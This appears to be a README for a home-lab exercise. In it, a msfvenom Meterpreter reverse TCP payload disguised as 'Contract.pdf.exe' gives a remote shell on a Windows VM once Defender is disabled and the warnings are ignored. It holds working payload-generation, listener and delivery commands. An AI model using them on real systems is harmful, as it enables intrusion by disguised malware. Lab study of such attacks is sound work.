# Establish reverse TCP Shell by Windows Executable created with Metasploit
Use malicious payload to create a reverse TCP shell. 

### Disclaimer:
All experiments are conducted in an isolated virtual lab for educational and research purposes only.

## Used in project:
- Proxmox VE
- Windows 10 VM
- Kali Linux VM
- pfSense firewall VM
- VLAN managed by pfSense

## Step 1: Create payload for Windows with MFSvenom
Enter the command  `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.10 lport=4444 -f exe -o Contract.pdf.exe` in Kali Linux terminal which:
- payload - `windows/x64/meterpreter/reverse_tcp`
- lhost - IP address for reverse shell
- lport -  port for reverse shell
- format - exe
- name - Contract.pdf

## Step 2: Open listening handler for reverse shell
Open metasploit by command `msfconsole` and enter commands:
- `use exploit/multi/handler`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set LHOST 192.168.10.10`
- `exploit`

## Step 3: Create HTTP server on Kali Linux VM to download malware
Open new tab in terminal and create HTTP server on port 9999 with command
- `python3 -m http.server 9999 `

## Step 4: Disable Windows Defender and download malware
In Windows Security tab:
- Disable `Real-time protection`
- Open up `kali_linux_ip:9999` in browser and download malware from http server
- Ignore chrome warnings

## Step 5: Use opened session
- Execute Contract.pdf.exe file and ignore Defender SmartScreen
 
![2025-02-27 17_53_49-proxmox - Proxmox Virtual Environment](https://github.com/user-attachments/assets/b5005ab5-dabf-41e4-9472-53343f874055)

- After that meterpreter session is opened
  
![2025-02-27 17_58_56-proxmox - Proxmox Virtual Environment](https://github.com/user-attachments/assets/0a06cbcf-0ce8-44d9-8617-ca43ebdfdf45)

- Open Windows shell by `shell` and run calculator by `calc` command as proove.

![2025-02-27 18_02_54-proxmox - Proxmox Virtual Environment](https://github.com/user-attachments/assets/57bc749a-6de8-42c5-973c-62c07e3d4011)

![2025-02-27 18_08_25-QEMU (Win10) - noVNC](https://github.com/user-attachments/assets/ac5b3a3c-feab-40e0-9b8b-83aa0ab936e0)





